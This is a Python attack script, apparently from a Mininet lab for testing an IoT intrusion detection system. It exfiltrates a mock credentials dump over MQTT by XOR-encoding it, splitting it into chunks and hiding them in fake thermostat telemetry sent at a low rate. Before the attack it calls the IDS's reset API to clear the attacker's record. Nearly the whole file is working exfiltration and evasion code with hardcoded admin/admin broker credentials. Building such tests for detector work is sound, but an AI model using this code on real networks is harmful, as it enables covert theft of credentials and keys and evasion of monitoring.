#!/usr/bin/env python3
"""
Attack 5 — Slow Drip Exfiltration
Gửi data nhỏ giọt, mimick normal traffic nhưng payload chứa
stolen data được mã hóa. Đặc trưng nhận diện: Tốc độ thấp (pkt_rate < 2.0),
Tỷ lệ PUBLISH cao (pub_to_conn_ratio lớn) và kích thước gói tin lớn (payload > 50).

Cách chạy:
1. Đảm bảo IDS đang chạy và đã reset state (đã có API /reset
    để xóa sạch vote cũ).
2. Chạy script này từ hattacker:
mininet> hattacker python3 attack5_slow_drip.py --host 10.0.0.10 --rate 1.0
"""

import paho.mqtt.client as mqtt
import time
import argparse
import base64
import json
import random
import logging
import math
import urllib.request
from datetime import datetime

logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)s — %(message)s")
log = logging.getLogger("SlowDrip")

XOR_KEY = 0x5A

# ── Dữ liệu bí mật cần exfiltrate ─────────────────────────────────────────────
SECRET_DATA = json.dumps({
    "type":        "credentials_dump",
    "broker_user": "admin",
    "broker_pass": "admin",
    "wifi_ssid":   "CorpNetwork",
    "wifi_psk":    "Enterprise@Pass",
    "api_keys":    ["key_abc123", "key_def456"],
    "internal_ips": ["192.168.1.1", "10.0.0.10"],
    "device_id":   "thermostat-bedroom-001",
})

def reset_ids_state(ids_ip="127.0.0.1", ids_port=5000, attacker_ip="10.0.0.99"):
    """Gọi API /reset của hệ thống IDS để xóa sạch vote cũ"""
    url = f"http://{ids_ip}:{ids_port}/reset"
    try:
        data = json.dumps({"ip": attacker_ip}).encode('utf-8')
        req = urllib.request.Request(url, data=data, method="POST")
        req.add_header('Content-Type', 'application/json')
        with urllib.request.urlopen(req, timeout=2.0) as response:
            log.info(f"♻️  Đã làm sạch bộ đệm IDS cho IP {attacker_ip} thành công!")
    except Exception as e:
        log.warning(f"⚠️  Không thể reset IDS API (Bỏ qua): {e}")

def xor_encode(data: str) -> str:
    """Mã hóa XOR đơn giản + base64 để nguỵ trang"""
    encoded = bytes([b ^ XOR_KEY for b in data.encode()])
    return base64.b64encode(encoded).decode()

def split_into_chunks(data: str, chunk_size: int) -> list:
    """Chia data thành nhiều mảnh nhỏ"""
    return [data[i:i+chunk_size] for i in range(0, len(data), chunk_size)]

def build_payload(chunk_encoded: str, seq: int, total: int) -> str:
    """
    Tạo payload. Mình cố tình độn thêm dữ liệu (padding)
    để ép mqtt.len > 50 bytes, khớp với luật Rule 1: Slow drip trong ids_api.py
    """
    base_temp = 22.5 + math.sin(seq * 0.3) * 2 + random.uniform(-0.5, 0.5)
    padding_to_trigger_ids = "x" * 20  # Độn thêm 20 ký tự để tăng kích thước gói
    payload_obj = {
        "dev": "sensor-001",
        "ts": datetime.now().isoformat(),
        "temp": round(base_temp, 2),
        "hum": round(55 + random.uniform(-5, 5), 1),
        "m": f"s={seq}&c={chunk_encoded}&pad={padding_to_trigger_ids}",
    }
    return json.dumps(payload_obj)

def run_slow_drip(host, port, topic, rate, chunk_size):
    encoded_secret = xor_encode(SECRET_DATA)
    chunks         = split_into_chunks(encoded_secret, chunk_size)
    total_chunks   = len(chunks)

    log.info(f"  Secret size : {len(SECRET_DATA)} bytes")
    log.info(f"  Total chunks: {total_chunks}")
    log.info(f"  Exfil rate  : {rate} msg/s (~{1/rate:.1f}s/msg)")

    client = mqtt.Client(client_id=f"iot-sensor-{random.randint(100,999)}")
    
    # Gắn cứng (hardcode) thông tin xác thực tại đây
    client.username_pw_set("admin", "admin")

    connected = [False]
    def on_connect(c, u, f, rc):
        if rc == 0:
            connected[0] = True
            log.info("  ✅ Kết nối Broker thành công (Auth: admin/admin)")
        else:
            log.error(f"  ❌ Kết nối thất bại (Return Code = {rc})")

    client.on_connect = on_connect
    client.connect(host, port, keepalive=120)
    client.loop_start()

    # Chờ kết nối hoàn tất
    time.sleep(1)
    if not connected[0]:
        log.error("Không kết nối được broker! Hãy kiểm tra lại Broker có đúng pass admin không.")
        client.loop_stop()
        return

    sent_chunks  = 0
    start_time   = time.time()

    for seq, chunk in enumerate(chunks):
        payload_str = build_payload(chunk, seq, total_chunks)

        # Gửi dữ liệu
        result = client.publish(topic, payload=payload_str, qos=0)
        
        if result.rc == mqtt.MQTT_ERR_SUCCESS:
            sent_chunks += 1
            log.info(f"  [{seq+1:>2}/{total_chunks}] Đã rỉ 1 giọt... [Size: {len(payload_str)} bytes]")
        else:
            log.warning(f"  [{seq+1}] ⚠️ Gửi thất bại do mạng hoặc bị Block!")
            break

        # Tạm nghỉ theo rate để duy trì pkt_rate thấp (< 2.0)
        sleep_time = (1 / rate) + random.uniform(-0.1, 0.1)
        time.sleep(max(0.1, sleep_time))

    client.loop_stop()
    client.disconnect()
    
    elapsed = time.time() - start_time
    avg_rate = sent_chunks / elapsed if elapsed > 0 else 0
    
    log.info("=" * 60)
    log.info("  📊 KẾT QUẢ TẤN CÔNG")
    log.info(f"  Chunks gửi : {sent_chunks}/{total_chunks}")
    log.info(f"  Tốc độ     : {avg_rate:.3f} msg/s (Cực kỳ khó phát hiện)")
    log.info("=" * 60)

def main():
    parser = argparse.ArgumentParser(description="Slow Drip MQTT Exfiltration")
    parser.add_argument("--host", default="127.0.0.1")
    parser.add_argument("--port", type=int, default=1883)
    parser.add_argument("--topic", default="home/sensor/temp")
    parser.add_argument("--rate", type=float, default=1.0, help="Msg/giây (Nên để 1.0 hoặc 1.5)")
    parser.add_argument("--chunk-size", type=int, default=20)
    args = parser.parse_args()

    log.info("=" * 60)
    log.info("  💧 ATTACK 5 — SLOW DRIP EXFILTRATION")
    log.info(f"  🎯 Target  : {args.host}:{args.port}")
    log.info(f"  🔐 Auth    : Đã gắn cứng (User: admin)")
    log.info("=" * 60)

    # TỰ ĐỘNG LÀM SẠCH IDS TRƯỚC KHI TẤN CÔNG
    reset_ids_state(attacker_ip="10.0.0.99")
    log.info("-" * 60)

    run_slow_drip(args.host, args.port, args.topic, args.rate, args.chunk_size)

if __name__ == "__main__":
    main()